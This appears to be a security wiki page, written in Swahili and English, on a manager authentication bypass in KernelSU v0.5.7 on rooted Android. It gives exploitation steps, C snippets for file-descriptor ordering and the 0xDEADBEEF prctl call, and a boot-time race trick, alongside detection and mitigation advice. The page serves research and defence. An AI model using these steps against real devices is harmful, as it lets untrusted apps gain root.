# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

Rooting frameworks kama KernelSU, APatch na SKRoot hupatch au ku-hook Android/Linux kernel na kufichua utendaji wenye privileges kwa app ya manager ya userspace isiyo na privileges. Magisk inajadiliwa kando hapa chini kwa sababu CVE-2024-48336 ilihusisha kupakia code upande wa manager badala ya njia hii ya KernelSU syscall.<sup>[[1]](#references)[[5]](#references)[[13]](#references)</sup>

Ukurasa huu unaweka kwa muhtasari techniques na pitfalls zilizogunduliwa katika utafiti wa umma (hasa uchambuzi wa Zimperium wa KernelSU v0.5.7) ili kusaidia red na blue teams kuelewa attack surfaces, exploitation primitives na robust mitigations.<sup>[[1]](#references)</sup>

---
## Architecture pattern: syscall-hooked manager channel

- Katika KernelSU v0.5.7, kernel hook kwenye `prctl` hupokea magic value, command ID na arguments maalum za command kutoka userspace.<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
- Caller huomba kwanza status ya manager kwa kutumia `CMD_BECOME_MANAGER`. Authorization ni maalum kwa kila command: `CMD_GRANT_ROOT` hukagua hali ya manager/allowlist, `CMD_ALLOW_SU` ni ya manager pekee, na `CMD_SET_SEPOLICY` ni ya root pekee katika version hii.<sup>[[2]](#references)[[11]](#references)</sup>
- Commands nyingine huuliza version/configuration au kuripoti matukio ya framework.<sup>[[2]](#references)</sup>
- Kwa kuwa app yoyote inaweza kuita syscall interface hii, usahihi wa manager authentication ni muhimu sana.<sup>[[1]](#references)[[2]](#references)</sup>

Mfano (muundo wa KernelSU):
- Hooked syscall: prctl
- Magic value ya kuielekeza kwenye KernelSU handler: 0xDEADBEEF
- Commands zinajumuisha: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT, etc.<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

---
## KernelSU v0.5.7 authentication flow (kama ilivyotekelezwa)

Userspace inapoiita prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...), KernelSU huthibitisha:<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

1) Path prefix check
- Path iliyotolewa lazima ianze na prefix inayotarajiwa kwa UID ya caller, kwa mfano /data/data/<pkg> au /data/user/<id>/<pkg>.
- Reference: core_hook.c (v0.5.7) path prefix logic.<sup>[[2]](#references)</sup>

2) Ownership check
- Path lazima imilikiwe na UID ya caller.
- Reference: core_hook.c (v0.5.7) ownership logic.<sup>[[2]](#references)</sup>

3) APK signature check kupitia FD table scan
- Pitia file descriptors zilizo wazi za calling process kwa mpangilio wa descriptor unaoongezeka.
- Kwa kila regular file ambayo path yake inaanza na `/data/app/` na kuishia na `/base.apk`, hakikisha path hiyo ina package substring iliyotokana na supplied data-directory path.
- Thibitisha signature ya candidate wa kwanza anayepita path checks hizo.
- Parse APK v2 signature na uithibitishe dhidi ya official manager certificate.
- References: manager.c (iterating FDs), apk_sign.c (APK v2 verification).<sup>[[3]](#references)[[4]](#references)</sup>

Checks zote zikifaulu, kernel huhifadhi UID ya manager kwa muda; commands za manager pekee hukubali UID hiyo, huku commands nyingine zikiendelea kutumia UID zao au checks za allowlist.<sup>[[2]](#references)[[3]](#references)</sup>

---
## Vulnerability class: trusting path-derived APK selection

KernelSU v0.5.7 haihusishi signature result na installed package identity ya PackageManager. Katika `manager.c`, package test ni path substring check pekee (`strstr(cwd, pkg)`); candidate wa kwanza anayepita check hiyo ya path ndiye anayefanyiwa signature check. Kwa hiyo attacker anaweza kuweka manager APK halisi chini ya path ya `/data/app/` ambayo pia ina package name ya attacker na kupanga ichaguliwe kwanza.<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>

Trust-by-indirection hii huwezesha app isiyo na privileges kujifanya manager bila kumiliki signing key ya manager.<sup>[[1]](#references)</sup>

Sifa kuu zilizotumiwa:<sup>[[1]](#references)[[3]](#references)</sup>
- FD scan hupangwa kwa descriptor index, na package check ni path substring test, si verified package-to-APK identity binding.
- open() hurudisha FD yenye namba ndogo zaidi inayopatikana. Kwa kufunga FDs zenye namba ndogo kwanza, attacker anaweza kudhibiti mpangilio.
- Manager APK iliyobunduliwa inaweza kuwekwa chini ya `/data/app/` kwenye path yenye package string ya attacker huku ikihifadhi official manager signature.

---
## Attack preconditions

Kesi halisi ya KernelSU v0.5.7 inahitaji:<sup>[[1]](#references)[[3]](#references)</sup>

- Device tayari ime-rootiwa kwa vulnerable rooting framework (kwa mfano, KernelSU v0.5.7).
- Attacker anaweza kuendesha arbitrary unprivileged code locally (Android app process).
- Kwa implementation ya v0.5.7, `current->real_parent` lazima iwe na UID 0 (source comment inaeleza hili kama zygote direct-child requirement); `manager.c` hukataa parents wengine.<sup>[[3]](#references)</sup>
- Manager halisi bado hajafanya authentication (kwa mfano, mara tu baada ya reboot). Frameworks fulani huhifadhi manager UID baada ya kufanikiwa; lazima ushinde race.<sup>[[1]](#references)</sup>

---
## Exploitation outline (KernelSU v0.5.7)

Hatua za kiwango cha juu (video ya demo iliyotajwa inaonyesha public proof of concept ikifanya kazi):<sup>[[1]](#references)[[2]](#references)[[10]](#references)</sup>
1) Tengeneza path halali ya data directory ya app yako ili kutimiza checks za prefix na ownership.
2) Weka genuine KernelSU Manager base.apk chini ya `/data/app/` kwenye path yenye package string yako, kisha ifungue kwenye FD yenye namba ndogo kuliko ya base.apk yako.
3) Ita prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...) ili upite checks.
4) Tumia `CMD_GRANT_ROOT`, kisha `CMD_ALLOW_SU` kwa su ya kudumu; ita root-only `CMD_SET_SEPOLICY` baada tu ya kupata root na pale tu inapoungwa mkono.

Maelezo ya vitendo kuhusu hatua ya 2 (FD ordering):<sup>[[1]](#references)</sup>
- Tambua FD ya process yako kwa ajili ya /data/app/*/base.apk yako kwa kupitia symlinks za /proc/self/fd.
- Funga FD yenye namba ndogo (kwa mfano, stdin, fd 0) na ufungue legitimate manager APK kwanza ili ichukue fd 0 (au index yoyote iliyo ndogo kuliko base.apk fd yako).
- Bundle legitimate manager APK pamoja na app yako ili path yake ianze na `/data/app/`, iishie na `/base.apk`, na iwe na package string yako. Kwa mfano, path iliyo chini ya `lib` directory ya app yako inaweza kutimiza checks hizi.<sup>[[1]](#references)[[3]](#references)</sup>

Example code snippets (Android/Linux, illustrative only):

Enumerate open FDs to locate base.apk entries:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
Lazimisha FD yenye nambari ndogo kuelekeze kwenye manager APK halali:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
Uthibitishaji wa Manager kupitia `prctl` hook ya KernelSU v0.5.7:<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 1  // KernelSU v0.5.7; other frameworks differ

int become_manager(const char *my_data_dir) {
uint32_t reply = 0;
// arg3: data path; arg4: unused; arg5: userspace result pointer
(void)prctl(KSU_MAGIC, CMD_BECOME_MANAGER,
(unsigned long)my_data_dir, 0UL,
(unsigned long)&reply);
return reply == KSU_MAGIC ? 0 : -1;
}
```
Baada ya kufanikiwa, commands zenye privileged (mifano):<sup>[[2]](#references)[[11]](#references)</sup>
- CMD_GRANT_ROOT: promote process ya sasa kuwa root
- CMD_ALLOW_SU: ongeza package/UID yako kwenye allowlist kwa su endelevu
- CMD_SET_SEPOLICY: rekebisha policy ya SELinux baada ya kupata root; KernelSU v0.5.7 hukagua UID 0 kwa command hii.<sup>[[2]](#references)</sup>

Race/persistence tip:
- Sajili receiver ya BOOT_COMPLETED katika AndroidManifest (`RECEIVE_BOOT_COMPLETED`) ili kuanza baada ya reboot na kujaribu authentication kabla ya manager halisi; permission hii inaruhusu kupokea `ACTION_BOOT_COMPLETED`, lakini yenyewe haihakikishi scheduling priority.<sup>[[1]](#references)[[12]](#references)</sup>

---
## Mwongozo wa Detection na mitigation

Kwa developers wa framework:
- Funga authentication kwenye package/UID ya caller, si kwenye FDs za kiholela:
- Tambua package ya caller kutoka kwenye UID yake na uithibitishe dhidi ya signature ya package iliyosakinishwa (kupitia PackageManager) badala ya kuscan FDs.
- Ikiwa ni kernel-only, tumia identity thabiti ya caller (task creds) na uithibitishe dhidi ya source of truth thabiti inayodhibitiwa na init/userspace helper, si process FDs.
- Epuka ukaguzi wa path-prefix kama identity; caller anaweza kuutimiza kwa urahisi.
- Tumia challenge–response inayotegemea nonce kupitia channel na uondoe manager identity yoyote iliyohifadhiwa kwenye cache wakati wa boot au kwenye key events.
- Zingatia IPC yenye authentication inayotegemea binder badala ya kupakia generic syscalls inapowezekana.

Kwa defenders/blue team:
- Tambua uwepo wa rooting frameworks na manager processes; monitor kwa prctl calls zenye magic constants zinazotia shaka (kwa mfano, 0xDEADBEEF) ikiwa una kernel telemetry.<sup>[[1]](#references)[[11]](#references)</sup>
- Kwenye fleets zinazosimamiwa, zuia au toa alert kuhusu boot receivers kutoka kwa packages zisizoaminika zinazojaribu kwa haraka manager commands zenye privileged baada ya boot.
- Hakikisha devices zimesasishwa hadi patched framework versions; invalidate manager IDs zilizohifadhiwa kwenye cache wakati wa update.

Limitations za attack:<sup>[[1]](#references)[[2]](#references)</sup>
- Huathiri tu devices ambazo tayari zime-rootiwa kwa framework iliyo vulnerable.
- Kwa kawaida huhitaji reboot/race window kabla ya manager halali kufanya authentication (baadhi ya frameworks huhifadhi manager UID kwenye cache hadi reset).

---
## Maelezo yanayohusiana katika frameworks mbalimbali

- Password-based auth (kwa mfano, historical APatch/SKRoot builds) inaweza kuwa dhaifu ikiwa passwords zinaweza kukisiwa/bruteforce au validations zina bugs.<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- Package/signature-based auth (kwa mfano, KernelSU) ni imara zaidi kinadharia, lakini lazima ifungwe kwenye caller halisi, si artefacts zinazotokana na path na kuchaguliwa kupitia FD scans.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- Magisk: CVE-2024-48336 iliathiri builds za kabla ya Canary 27007 zilizopakia code kutoka kwenye GMS package isiyothibitishwa, hivyo kuruhusu local app kutekeleza code ndani ya Magisk app na kufanya privilege escalation hadi root bila user interaction.<sup>[[8]](#references)[[9]](#references)[[13]](#references)</sup>

---
## References

- [1] [Zimperium – Rooting ya Uovu Wote: Mashimo ya Usalama Yanayoweza Kuhatarisha Kifaa Chako cha Simu](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [2] [KernelSU v0.5.7 – ukaguzi wa authentication wa core_hook.c](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L149-L205)
- [3] [KernelSU v0.5.7 – iteration ya FD ya manager.c, ukaguzi wa package na call ya signature](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L16-L67)
- [4] [KernelSU v0.5.7 – uthibitishaji wa APK v2 wa apk_sign.c](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/apk_sign.c#L6-L119)
- [5] [Mradi wa KernelSU](https://kernelsu.org/)
- [6] [APatch](https://github.com/bmax121/APatch)
- [7] [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [8] [Magisk issue #8279 – Thibitisha kuwa GMS ni system app](https://github.com/topjohnwu/Magisk/issues/8279)
- [9] [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [10] [Video ya demo ya KSU PoC (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)
- [11] [KernelSU v0.5.7 – vitambulisho vya commands vya ksu.h](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/ksu.h#L12-L24)
- [12] [Android Manifest.permission.RECEIVE_BOOT_COMPLETED](https://developer.android.com/reference/android/Manifest.permission#RECEIVE_BOOT_COMPLETED)
- [13] [NVD – CVE-2024-48336](https://nvd.nist.gov/vuln/detail/CVE-2024-48336)
{{#include ../../banners/hacktricks-training.md}}
